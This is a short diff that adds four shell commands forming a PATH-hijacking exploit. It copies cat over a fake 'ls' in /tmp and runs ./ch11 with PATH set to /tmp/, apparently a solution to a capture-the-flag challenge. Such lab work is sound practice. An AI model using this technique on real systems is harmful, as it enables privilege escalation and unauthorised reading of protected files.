@@ -1,1 +1,4 @@
-
+ rm /tmp/ls
+ cp /bin/cat /tmp/ls
+ PATH=/tmp/
+ ./ch11
